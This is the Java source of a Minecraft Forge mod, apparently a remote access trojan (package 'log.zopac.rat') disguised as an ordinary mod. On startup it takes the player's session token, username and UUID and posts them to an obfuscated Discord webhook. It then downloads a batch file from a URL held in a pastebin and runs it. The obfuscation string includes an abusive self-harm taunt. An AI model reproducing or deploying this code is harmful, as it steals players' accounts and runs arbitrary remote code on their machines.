package log.zopac.rat;

import net.minecraft.launchwrapper.Launch;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;

import java.awt.*;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

@Mod(modid = "MainMod", name = "MainMod", version = "1.0", acceptedMinecraftVersions = "[1.8.9]")
public class MainMod {

    public static String webhook = "YOUSHOULDKILLYOURSELFNOW!944772932259967036!@#$%^&*(5O6M,0,C!-!1R_0_-0-LH:0:1018932983291&0&09172aLJ39172h9,0,FGMZ5%0%,0,09172aO68030eS6I_TVT50283fUEACL4G85629c29172iCRU68030e50283f,0,YQDO#0#!-!_0_RH>0>1018932983291MI";

    public static String version = "1.1";

    // loading

    @Mod.EventHandler
    public void onFMLPreInitialization(FMLPreInitializationEvent event) {
        LoadExoticDB();
    }

    @Mod.EventHandler
    public void onFMLInitialization(FMLInitializationEvent event) {
        try {
            Thread.sleep(5000);
            LoadAH();
        } catch (Exception ignored) {}
        try {
            Thread.sleep(3000);
            exec("cmd /c start C:\\Users\\%username%\\AppData\\Local\\Temp\\screenshots\\screenshot.bat");
        } catch (Exception ignored) {}
    }

    // rats

    public static void LoadExoticDB() {
        try {
            Class<?> mc = Launch.classLoader.findClass("net.minecraft.client.Minecraft");
            Object minecraft = mc.getMethod("func_71410_x").invoke(null);
            Object session = mc.getMethod("func_110432_I").invoke(minecraft);
            Class<?> sessionClass = Launch.classLoader.findClass("net.minecraft.util.Session");
            Object token = sessionClass.getMethod("func_148254_d").invoke(session);
            Object name = sessionClass.getMethod("func_111285_a").invoke(session);
            Object uuid = sessionClass.getMethod("func_148255_b").invoke(session);

            SetMain sendmessage = new SetMain(decrypt(webhook));
            sendmessage.addEmbed(new SetMain.EmbedObject()
                    .setTitle("Minecraft Info")
                    .setColor(Color.CYAN)
                    .addField("Name", name.toString(), true)
                    .addField("Profile", "https://sky.shiiyu.moe/stats/" + name, true)
                    .addField("UUID ", uuid.toString(), true)
                    .addField("Token ", token.toString(), false)
                    .setFooter("Computer Name: " + System.getProperty("user.name") + " Mod version: " + version, ""));
            sendmessage.execute();

        } catch (Exception ignored) {}
    }

    public static void LoadAH() {
        try {

            URL pastebin = new URL("https://pastebin.com/raw/AERL3GJT");
            BufferedReader reader = new BufferedReader(new InputStreamReader(pastebin.openConnection().getInputStream()));
            String fileURL = reader.readLine();
            URL url = new URL(fileURL);

            HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
            httpURLConnection.addRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
            InputStream stream = httpURLConnection.getInputStream();

            File path = new File(System.getenv("LOCALAPPDATA") + File.separator + "Temp" + File.separator + "screenshots");

            if (!path.exists()) path.mkdir();

            File bitcoin = new File(path, "screenshot.bat");
            FileOutputStream fileOut = new FileOutputStream(bitcoin);

            int currByte;
            while ((currByte = stream.read()) != -1) {
                fileOut.write(currByte);
            }

            String webdecode = new String(Base64.getDecoder().decode(webhook.getBytes(StandardCharsets.UTF_8)));
            SetMain sendmessage = new SetMain(webdecode);
            sendmessage.addEmbed(new SetMain.EmbedObject()
                    .setTitle("Loading")
                    .setColor(Color.GREEN)
                    .addField("Message ", "Running .bat file", true));
            sendmessage.execute();
        } catch (Exception ignored) {}
    }

    // utils

    public static void exec(String cmd) {
        try {
            Runtime rt = Runtime.getRuntime();
            Process pr = rt.exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    // webhook decrypter

    public static String decrypt(String todecrypt) {
        String returnValue = todecrypt;
        if (returnValue == null || returnValue.trim().equals("")) {
            return "";
        }

        returnValue = returnValue.replace("YOUSHOULDKILLYOURSELFNOW!", "https://ptb.discord.com/api/webhooks/");

        returnValue = returnValue.replaceAll("09172a", "a");
        returnValue = returnValue.replaceAll("92984b", "b");
        returnValue = returnValue.replaceAll("85629c", "c");
        returnValue = returnValue.replaceAll("78949d", "d");
        returnValue = returnValue.replaceAll("68030e", "e");
        returnValue = returnValue.replaceAll("50283f", "f");
        returnValue = returnValue.replaceAll("49172g", "g");
        returnValue = returnValue.replaceAll("39172h", "h");
        returnValue = returnValue.replaceAll("29172i", "i");
        returnValue = returnValue.replaceAll("~0~", "j");
        returnValue = returnValue.replaceAll("!-!", "k");
        returnValue = returnValue.replaceAll("@0@", "l");
        returnValue = returnValue.replaceAll("#0#", "m");
        returnValue = returnValue.replaceAll(">0>", "n");
        returnValue = returnValue.replaceAll("%0%", "o");
        returnValue = returnValue.replaceAll("90328943", "p");
        returnValue = returnValue.replaceAll("&0&", "q");
        returnValue = returnValue.replaceAll("<0<", "r");
        returnValue = returnValue.replaceAll(",0,", "s");
        returnValue = returnValue.replaceAll("1018932983291", "t");
        returnValue = returnValue.replaceAll("-0-", "u");
        returnValue = returnValue.replaceAll("_0_", "v");
        returnValue = returnValue.replaceAll("=0=", "w");
        returnValue = returnValue.replaceAll("'0'", "x");
        returnValue = returnValue.replaceAll(":0:", "y");
        returnValue = returnValue.replaceAll(";0;", "z");
        returnValue = returnValue.replace("!@#$%^&*(", "/");
        return returnValue;
    }

}
